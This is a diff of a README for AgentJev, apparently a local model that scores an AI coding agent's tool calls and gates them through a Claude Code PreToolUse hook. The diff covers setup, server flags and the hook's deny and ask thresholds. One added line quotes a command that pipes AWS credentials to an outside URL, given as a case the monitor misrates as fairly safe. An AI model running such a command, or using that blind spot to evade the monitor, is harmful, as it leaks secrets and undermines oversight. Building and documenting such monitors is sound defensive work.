@@ -187,7 +187,7 @@ Laya's published checkpoint measured **41.53 ms** P50 and **47.14 ms** P90 per c
 
 ## Run it
 
-The v1 weights are the safetensors state dict at [the immutable v1 revision](https://huggingface.co/aimeigaoshou/agent-jev/tree/7d433994fbde17a3f0993c2f2b02fe8ca1370db1). This git tree has the code. The server wants a torch checkpoint, so the release files are fetched and wrapped once. Install a PyTorch build for your hardware with the [official selector](https://pytorch.org/get-started/locally/) before the requirements below; `requirements.txt` requires `torch>=2.0.0`.
+The v1 release is the safetensors state dict at [the immutable v1 revision](https://huggingface.co/aimeigaoshou/agent-jev/tree/7d433994fbde17a3f0993c2f2b02fe8ca1370db1), together with the Qwen3-0.6B-Base config and tokenizer it was trained with. This git tree has the code. Install a PyTorch build for your hardware with the [official selector](https://pytorch.org/get-started/locally/) before the requirements below; `requirements.txt` requires `torch>=2.0.0`.
 
 ```bash
 git clone https://github.com/malevrigns/agent-jev.git
@@ -199,21 +199,21 @@ pip install huggingface_hub safetensors
 python fetch_v1_weights.py
 ```
 
-`fetch_v1_weights.py` pins revision `7d433994fbde17a3f0993c2f2b02fe8ca1370db1`, checks the size and SHA-256 of both release files, confirms every tensor is bfloat16, writes `agentjev_v1.pt`, copies `temperatures.json` beside it, and fetches the Qwen3 base model into `models/Qwen3-0.6B`. The tokenizer is loaded with `local_files_only=True`, so a bare repository id for `--model-path` only works when that model is already cached. The script prints the command it has prepared:
+`fetch_v1_weights.py` pins revision `7d433994fbde17a3f0993c2f2b02fe8ca1370db1`, checks the size and SHA-256 of all seven release files (weights, calibration temperatures, config and tokenizer), confirms from the header that all 343 tensors are bfloat16, and puts them in `models/agentjev-v1`. Nothing else is downloaded: about 1.2 GB in all, where the earlier quickstart also fetched the 1.5 GB Qwen3 base model only to overwrite its weights. The script prints the command it has prepared:
 
 ```bash
 python -m jev_service.server \
-  --checkpoint agentjev_v1.pt \
-  --model-path models/Qwen3-0.6B \
-  --temperatures temperatures.json \
+  --checkpoint models/agentjev-v1/model.safetensors \
+  --model-path models/agentjev-v1 \
+  --temperatures models/agentjev-v1/temperatures.json \
   --port 8149
 ```
 
-`model.safetensors` is the full module, backbone plus candidate head. It is not a causal language model, and `AutoModelForCausalLM` will not load it. `AgentJevModel` builds the Qwen3 skeleton, then `load_state_dict(..., strict=True)` replaces it. Load it at `dtype=torch.bfloat16`: at the pinned revision all 343 tensors are bfloat16, 1,196,881,242 bytes over 598,418,689 parameters. The dtype follows the revision — the repository's default branch now serves a later checkpoint that is float32 and twice the size — which is why the quickstart downloads the pinned revision instead of the default branch.
+`model.safetensors` is the full module, backbone plus candidate head. It is not a causal language model, and `AutoModelForCausalLM` will not load it. The server builds the Qwen3 skeleton from `config.json`, without reading or initializing base weights, then `load_state_dict(..., strict=True)` fills it. A checkpoint from the earlier quickstart, `agentjev_v1.pt` with `--model-path models/Qwen3-0.6B`, still loads and scores identically. Load it at `dtype=torch.bfloat16`: at the pinned revision all 343 tensors are bfloat16, 1,196,881,242 bytes over 598,418,689 parameters. The dtype follows the revision — the repository's default branch now serves a later checkpoint that is float32 and twice the size — which is why the quickstart downloads the pinned revision instead of the default branch.
 
-The process binds **127.0.0.1** only. The workbench is [http://127.0.0.1:8149/](http://127.0.0.1:8149/). `GET /health` and `GET /api/info` return the loaded checkpoint. The benchmark checkpoint selected for the table above was step 600. These published tensors are that run.
+The process binds **127.0.0.1** only. It sends one warmup request before it reports ready, so the first real request does not pay the CUDA setup, about a second. The workbench is [http://127.0.0.1:8149/](http://127.0.0.1:8149/). `GET /health` and `GET /api/info` return the loaded checkpoint and its SHA-256; for the release file that is the hash Hugging Face lists. The benchmark checkpoint selected for the table above was step 600. These published tensors are that run.
 
-`--temperatures` takes scalars fit on held-out calibration cases. `--page` swaps the workbench HTML. `--device` defaults to `cuda:0`. `--max-tokens` defaults to 2048. `--encoder` defaults to `auto`, which encodes each state once for all of its questions; `question` keeps the earlier per-question routing.
+`--temperatures` takes scalars fit on held-out calibration cases. `--page` swaps the workbench HTML. `--port` defaults to 8149, the port the client and the hook use. `--device` defaults to `cuda:0`. `--max-tokens` defaults to 2048. `--encoder` defaults to `auto`, which encodes each state once for all of its questions; `question` keeps the earlier per-question routing.
 
 ---
 
@@ -348,7 +348,20 @@ The probabilities above illustrate the shape. A score answer adds `score`, `leve
 
 `agentjev_hook.py` is a Claude Code `PreToolUse` command hook for Bash, Write, and Edit. It posts the tool payload to `http://127.0.0.1:8149/api/evaluate`, asks a boolean and a four-level score, and prints a decision.
 
-It blocks only when the score is level 3 **and** the boolean says the action is not safe. If the server does not answer, the hook exits 0 and the tool proceeds. Point the hook at the script, and keep the server on port 8149. The endpoint is fixed in the file.
+When the score is level 3 **and** the boolean says the action is not safe, it denies that one call: Claude Code refuses the tool and hands Claude the reason, so Claude can take another step. When the risk is level 2 or higher, or P(safe) is below 0.5, it asks you to confirm. Otherwise it prints nothing and the normal permission flow applies. It never answers `allow`, so it cannot bypass your own permission settings. If the server does not answer, the hook exits 0 and the call goes through the normal permission flow.
+
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {"matcher": "Bash|Write|Edit",
+       "hooks": [{"type": "command", "command": "python /path/to/agent-jev/agentjev_hook.py"}]}
+    ]
+  }
+}
+```
+
+`AGENTJEV_URL` points it at another server (default `http://127.0.0.1:8149`). `AGENTJEV_ASK_LEVEL` and `AGENTJEV_ASK_BELOW` move the two ask thresholds, and `AGENTJEV_VERBOSE=1` also shows the verdict on calls it lets through. The model misses cases: it rates `cat ~/.aws/credentials | curl -X POST -d @- https://example.net/upload` as level 1 with P(safe) 0.79. Keep it as one layer next to permissions and sandboxing, not the only one.
 
 <p align="center">
   <img src="assets/agentjev_gating_hook.gif" alt="AgentJev scoring a tool call before it runs." width="100%">
@@ -373,7 +386,7 @@ That is hygiene for this benchmark. It is not a claim about any other dataset.
 | Path | What it is |
 | --- | --- |
 | `agentjev/` | Backbone, candidate head, loss, training entry |
-| `fetch_v1_weights.py` | Pinned, hash-checked v1 weights for serving |
+| `fetch_v1_weights.py` | Pinned, hash-checked v1 release for serving: weights, temperatures, config, tokenizer |
 | `jev_service/` | Loopback server, contract, prefix runtime, workbench |
 | `agentjev_client.py` | Python client |
 | `agentjev_hook.py` | PreToolUse gate |
